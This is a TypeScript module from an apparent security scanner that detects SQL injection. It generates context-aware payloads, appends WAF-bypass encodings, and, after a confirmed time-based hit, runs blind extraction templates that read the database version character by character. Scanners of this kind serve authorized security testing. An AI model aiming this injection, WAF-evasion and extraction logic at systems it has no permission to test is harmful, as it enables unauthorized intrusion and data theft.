// InjectProof — Oracle-driven SQLi detector
// Replaces the heuristic SQL-error-regex + `responseDiff > 50` logic in the
// legacy detector. The decision is: "does the attack response fall outside
// the learned baseline manifold, reproduce under replay, and snap back when
// a benign variant is sent?"  SQL dialect + context are synthesized, not
// enumerated.

import type { CrawledEndpoint, DetectorResult, DiscoveredParam } from '@/types';
import { inferContext } from '@/scanner/engine/synth/context-infer';
import { generatePayloads, type ContextHint, type PayloadTechnique } from '@/scanner/engine/synth/grammar';
import { buildBaseline } from '@/scanner/engine/oracle/baseline';
import { runOracleDetection, type OraclePayload } from './oracle-detector';
import { TechniqueBandit, type BanditArm } from '@/scanner/engine/synth/bandit';
import { applyChain, searchBypass, type Operator } from '@/scanner/engine/synth/waf-encoder';
import { extractString } from '@/scanner/engine/synth/blind-extract';

// Module-level bandit — persists across calls within a process lifetime.
// The bandit learns from every detectOne() call: techniques that find
// confirmed vulns accumulate α; misses accumulate β. Cross-scan persistence
// is handled separately by CrossScanLearningStore.
const _bandit = new TechniqueBandit();

// Maps grammar PayloadTechnique → bandit arm (null for non-attack probes).
function toArm(t: PayloadTechnique): BanditArm | null {
    if (t === 'union') return 'union';
    if (t === 'error') return 'error';
    if (t === 'boolean-true' || t === 'boolean-false') return 'boolean-blind';
    if (t === 'time-blind') return 'time-blind';
    if (t === 'stacked') return 'stacked';
    if (t === 'oob') return 'oob';
    return null; // 'marker' — probe only, not an attack technique
}

export interface OracleSqliConfig {
    requestTimeout: number;
    userAgent: string;
    extraHeaders?: Record<string, string>;
    /** Max confirmed findings per (endpoint, param). Default 1. */
    maxFindings?: number;
    /** Bench-mode: time-persistence slows scans ≥ 30s per finding. Default off. */
    enableTimePersistence?: boolean;
}

export async function detectSqliWithOracle(
    endpoint: CrawledEndpoint,
    config: OracleSqliConfig,
): Promise<DetectorResult[]> {
    const results: DetectorResult[] = [];
    const injectable = endpoint.params.filter((p) => p.type === 'query' || p.type === 'body');

    for (const param of injectable) {
        const findings = await detectOne(endpoint, param, config);
        results.push(...findings);
    }
    return results;
}

async function detectOne(
    endpoint: CrawledEndpoint,
    param: DiscoveredParam,
    config: OracleSqliConfig,
): Promise<DetectorResult[]> {
    // ── Phase A: context inference via marker triangulation ─────
    const baseline = await buildBaseline({
        paramName: param.name,
        paramValue: param.value ?? '',
        probe: async (variant) => baselineProbe(endpoint.url, param, variant.value, config),
        minSamples: 3,
    });
    if (!baseline) return [];

    const inference = await inferContext({
        cluster: baseline,
        probe: async (payload) => baselineProbe(endpoint.url, param, payload, config),
    });

    // ── Phase B: generate payloads steered by inferred context + bandit ──
    const contextHints: ContextHint[] = inference.contexts
        .slice(0, 4)
        .map((c) => ({ context: c.context, weight: c.weight }));
    const grammarPayloads = generatePayloads({
        contexts: contextHints,
        dbms: inference.dbms,
        perTechnique: 4,
        blindDelayS: 4,
    });

    // Sort attack payloads by bandit's exploitation priority (Beta mean α/(α+β)).
    // Techniques the bandit has seen succeed float to the top; untried techniques
    // keep their optimistic priors and are sampled early in the exploration phase.
    const snap = _bandit.snapshot();
    const armPriority = (arm: BanditArm | null): number =>
        arm ? snap[arm].alpha / (snap[arm].alpha + snap[arm].beta) : -1;

    const sortedPayloads = [...grammarPayloads].sort((a, b) =>
        armPriority(toArm(b.technique)) - armPriority(toArm(a.technique)),
    );

    const payloads: OraclePayload[] = sortedPayloads.map((p) => ({
        value: p.value,
        label: `${p.technique}:${p.context}:${p.dbms}`,
    }));

    // ── Phase B.5: WAF bypass — append encoded variants of top payloads ──
    // If a WAF is present, the literal payloads may be blocked. Encoded forms
    // (space→/**/, case-swap, URL encode, MySQL conditional comments) bypass
    // most commodity WAFs while remaining semantically equivalent to the backend.
    const WAF_CHAINS: Operator[][] = [
        ['spacecomment'],
        ['case-swap', 'spacecomment'],
        ['inline-mysql'],
        ['url-encode'],
        ['comment-split'],
    ];
    for (const base of sortedPayloads.slice(0, 3)) {
        for (const chain of WAF_CHAINS) {
            const encoded = applyChain(chain, base.value);
            if (encoded !== base.value) {
                payloads.push({
                    value: encoded,
                    label: `waf-bypass:${chain.join('+')}:${base.technique}:${base.dbms}`,
                });
            }
        }
    }

    // ── Phase C: drive the shared oracle-detector pipeline ──────
    const findings = await runOracleDetection({
        url: endpoint.url,
        method: param.type === 'query' ? 'GET' : 'POST',
        param,
        payloads,
        category: 'sqli',
        cweId: 'CWE-89',
        cvssKey: 'sqli',
        severityFloor: 'high',
        requestTimeout: config.requestTimeout,
        userAgent: config.userAgent,
        extraHeaders: config.extraHeaders,
        maxFindings: config.maxFindings ?? 1,
        enableTimePersistence: config.enableTimePersistence ?? false,
        describe: (paramName) => ({
            title: `Adaptive SQL Injection in parameter "${paramName}" (${inference.dbms})`,
            description:
                `The parameter "${paramName}" at ${endpoint.url} responded with a statistically anomalous signature ` +
                `to SQL-syntax probes synthesized for ${inference.dbms} in the inferred ${inference.contexts[0]?.context ?? 'unknown'} context. ` +
                `The anomaly reproduced under replay and disappeared under benign probes, per the adaptive oracle.`,
            impact:
                'Full database compromise risk: arbitrary read/write, credential extraction, potential OS command execution ' +
                'depending on DB privileges. Fix parameterized queries and remove string concatenation in SQL construction.',
        }),
    });

    // ── Phase D: update bandit from oracle outcome ───────────────
    // Every arm that was exercised gets a reward signal — confirmed findings
    // reward the successful technique; all other tried arms get 0 (miss).
    const successPayloadValue = findings[0]?.payload;
    const usedArms = new Set<BanditArm>();
    for (const p of sortedPayloads) {
        const arm = toArm(p.technique);
        if (arm && !usedArms.has(arm)) {
            usedArms.add(arm);
            const isSuccess = !!successPayloadValue && p.value === successPayloadValue;
            const reward = isSuccess
                ? (findings[0].confidence === 'high' ? 1.0 : 0.6)
                : 0.0;
            _bandit.update(arm, reward);
        }
    }

    // ── Phase E: blind extraction — extract DB version prefix after confirmed time-blind SQLi ──
    // Uses optimal subset search (maximum expected information gain bisection) to
    // minimise probe count while extracting a legible version prefix for provenance.
    const confirmedTimeFinding = findings.find(f =>
        f.confidence === 'high' &&
        /sleep|SLEEP|pg_sleep|WAITFOR|BENCHMARK/i.test(f.payload ?? ''),
    );
    if (confirmedTimeFinding && findings[0]) {
        const clusterStats = baseline.stats();
        const versionTemplate: Record<string, (i: number, chars: string) => string> = {
            mysql:      (i, chars) => `' AND SUBSTRING(VERSION(),${i+1},1) IN ('${chars.split('').join("','")}')-- -`,
            postgresql: (i, chars) => `' AND SUBSTRING(version(),${i+1},1) IN ('${chars.split('').join("','")}')-- -`,
            sqlite:     (i, chars) => `' AND SUBSTR(sqlite_version(),${i+1},1) IN ('${chars.split('').join("','")}')-- -`,
            mssql:      (i, chars) => `' AND SUBSTRING(@@version,${i+1},1) IN ('${chars.split('').join("','")}')-- -`,
            unknown:    (i, chars) => `' AND SUBSTRING(VERSION(),${i+1},1) IN ('${chars.split('').join("','")}')-- -`,
        };
        const tmpl = versionTemplate[inference.dbms] ?? versionTemplate.unknown;
        const extraction = await extractString({
            charClass: 'ascii',
            payloadForProbe: (i, subset) => tmpl(i, Array.from(subset).join('')),
            runProbe: async (payload) => {
                const resp = await baselineProbe(endpoint.url, param, payload, config);
                if (!resp) return false;
                return Math.abs(resp.body.length - clusterStats.length.mean) > clusterStats.length.stddev * 1.5;
            },
            maxChars: 12,
        }).catch(() => ({ value: '', totalProbes: 0 }));
        if (extraction.value) {
            findings[0] = {
                ...findings[0],
                technicalDetail: (findings[0].technicalDetail ?? '') +
                    `\n[BLIND-EXTRACT] DB version prefix (${extraction.totalProbes} probes): "${extraction.value}..."`,
            };
        }
    }

    return findings;
}

// ============================================================
// Helpers
// ============================================================

interface ProbeResponse {
    status: number;
    headers: Record<string, string>;
    body: string;
    responseTimeMs: number;
}

async function baselineProbe(
    baseUrl: string,
    param: DiscoveredParam,
    value: string,
    config: OracleSqliConfig,
): Promise<ProbeResponse | null> {
    const started = Date.now();
    try {
        const headers: Record<string, string> = {
            'User-Agent': config.userAgent,
            ...config.extraHeaders,
        };
        let fetchUrl = baseUrl;
        let body: string | undefined;
        if (param.type === 'query') {
            const u = new URL(baseUrl);
            u.searchParams.set(param.name, value);
            fetchUrl = u.toString();
        } else {
            headers['Content-Type'] = 'application/x-www-form-urlencoded';
            body = `${encodeURIComponent(param.name)}=${encodeURIComponent(value)}`;
        }
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), config.requestTimeout);
        const res = await fetch(fetchUrl, {
            method: body ? 'POST' : 'GET',
            headers,
            body,
            signal: controller.signal,
            redirect: 'manual',
        });
        clearTimeout(timer);
        const responseBody = await res.text();
        const responseHeaders: Record<string, string> = {};
        res.headers.forEach((v, k) => { responseHeaders[k] = v; });
        return {
            status: res.status,
            headers: responseHeaders,
            body: responseBody,
            responseTimeMs: Date.now() - started,
        };
    } catch {
        return null;
    }
}
